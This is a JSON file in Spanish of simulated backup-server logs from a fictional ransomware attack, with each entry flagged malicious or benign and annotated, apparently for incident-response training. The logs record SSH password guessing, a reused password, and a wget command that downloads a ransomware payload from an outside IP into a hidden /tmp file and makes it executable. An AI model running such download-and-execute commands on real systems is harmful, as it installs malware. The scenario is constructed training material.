@@ -1,0 +1,141 @@
+{
+  "descripcion": "auth.log y syslog de SRV-BACKUP-01 — Ubuntu Server 22.04 LTS · servidor de backups aislado · solo accesible desde la red interna 10.10.2.0/24. Los backups de FinCorp se almacenan en /mnt/backup-nas/. Un backup íntegro de anoche (02:45) podría ser la única copia válida.",
+  "logs": [
+    {
+      "timestamp": "14 nov · 02:45:01",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "rsync[14821]: conexión entrante desde 10.10.1.15 — iniciando sincronización de /mnt/backup-nas/fincorp/daily/",
+      "malicioso": false,
+      "nota": "Backup nocturno legítimo completado — esta copia está íntegra y es anterior al ataque"
+    },
+    {
+      "timestamp": "14 nov · 02:48:33",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "rsync[14821]: transferidos 14.832 ficheros (23.4 GB) — velocidad: 158 MB/s — OK",
+      "malicioso": false,
+      "nota": "Backup completado con éxito 26 minutos antes del inicio del ataque de cifrado"
+    },
+    {
+      "timestamp": "14 nov · 03:12:41",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15204]: Failed password for backup_svc from 10.10.5.42 port 54821 ssh2",
+      "malicioso": true,
+      "nota": "PRIMER INTENTO SSH FALLIDO desde WKSTN-042 — IP inesperada para el servidor de backups"
+    },
+    {
+      "timestamp": "14 nov · 03:12:43",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15205]: Failed password for backup_svc from 10.10.5.42 port 54822 ssh2",
+      "malicioso": true,
+      "nota": "2º intento fallido — el malware prueba contraseñas del listado extraído de WKSTN-042"
+    },
+    {
+      "timestamp": "14 nov · 03:12:44",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15206]: Failed password for backup_svc from 10.10.5.42 port 54823 ssh2",
+      "malicioso": true,
+      "nota": "3er intento fallido"
+    },
+    {
+      "timestamp": "14 nov · 03:12:46",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15207]: Failed password for backup_svc from 10.10.5.42 port 54824 ssh2",
+      "malicioso": true,
+      "nota": "4º intento fallido"
+    },
+    {
+      "timestamp": "14 nov · 03:13:09",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15212]: Accepted password for backup_svc from 10.10.5.42 port 54831 ssh2 — sesión abierta",
+      "malicioso": true,
+      "nota": "LOGIN EXITOSO — contraseña 'Backup2024!' reutilizada desde credenciales extraídas de WKSTN-042"
+    },
+    {
+      "timestamp": "14 nov · 03:13:11",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sudo[15215]: backup_svc : TTY=pts/0 ; PWD=/home/backup_svc ; USER=root ; COMMAND=/bin/ls /mnt/backup-nas/",
+      "malicioso": true,
+      "nota": "Reconocimiento — el atacante lista el contenido del directorio de backups para confirmar que existen"
+    },
+    {
+      "timestamp": "14 nov · 03:13:19",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sudo[15218]: backup_svc : COMMAND=/bin/df -h — output: /mnt/backup-nas 23.4G used / 8.0T total",
+      "malicioso": true,
+      "nota": "El atacante verifica el tamaño total de los backups — evaluando qué borrar o cifrar primero"
+    },
+    {
+      "timestamp": "14 nov · 03:13:47",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sudo[15221]: backup_svc : COMMAND=/usr/bin/wget http://185.220.101.47/lx/crypt_lx -O /tmp/.crypt — 892 KB descargados",
+      "malicioso": true,
+      "nota": "DESCARGA DEL PAYLOAD LINUX — versión del ransomware para Linux guardada en /tmp/.crypt"
+    },
+    {
+      "timestamp": "14 nov · 03:14:02",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sudo[15224]: backup_svc : COMMAND=/bin/chmod +x /tmp/.crypt",
+      "malicioso": true,
+      "nota": "Permiso de ejecución al payload Linux — el ataque a los backups está a 5 segundos de comenzar"
+    },
+    {
+      "timestamp": "14 nov · 03:14:08",
+      "host": "SRV-BACKUP-01",
+      "usuario": "root",
+      "mensaje": "kernel: [NightCrypt] iniciando cifrado en /mnt/backup-nas/ — proceso detenido por OOM killer (memoria insuficiente)",
+      "malicioso": true,
+      "nota": "EL CIFRADO DEL BACKUP FUE INTERRUMPIDO — el servidor de backups solo tiene 2 GB RAM y el proceso fue matado por el SO"
+    },
+    {
+      "timestamp": "14 nov · 03:14:09",
+      "host": "SRV-BACKUP-01",
+      "usuario": "root",
+      "mensaje": "kernel: Out of memory: Kill process 15231 (.crypt) score 892 or sacrifice child — Killed process 15231",
+      "malicioso": false,
+      "nota": "El OOM killer del kernel Linux mató el proceso de cifrado — los backups están ÍNTEGROS"
+    },
+    {
+      "timestamp": "14 nov · 03:14:31",
+      "host": "SRV-BACKUP-01",
+      "usuario": "backup_svc",
+      "mensaje": "sshd[15212]: Received disconnect from 10.10.5.42 port 54831: 11: disconnected by user",
+      "malicioso": true,
+      "nota": "El atacante se desconecta — probablemente detectó que el cifrado del backup falló"
+    },
+    {
+      "timestamp": "14 nov · 03:16:00",
+      "host": "SRV-BACKUP-01",
+      "usuario": "root",
+      "mensaje": "fail2ban: Ban 10.10.5.42 — 4 intentos SSH fallidos en 30 segundos — ban de 10 minutos",
+      "malicioso": false,
+      "nota": "fail2ban bloquea la IP de WKSTN-042 — tarde pero útil para evitar un segundo intento"
+    },
+    {
+      "timestamp": "14 nov · 02:00:00",
+      "host": "SRV-BACKUP-01",
+      "usuario": "root",
+      "mensaje": "cron[12041]: (root) CMD (/usr/bin/certbot renew --quiet) — renovación SSL rutinaria",
+      "malicioso": false,
+      "nota": "Tráfico legítimo de mantenimiento"
+    },
+    {
+      "timestamp": "14 nov · 01:30:00",
+      "host": "SRV-BACKUP-01",
+      "usuario": "root",
+      "mensaje": "sshd[11983]: Accepted publickey for deploy from 10.10.8.10 — sesión de monitoring",
+      "malicioso": false,
+      "nota": "Acceso legítimo del sistema de monitorización — usuario deploy con clave SSH"
+    }
+  ]
+}
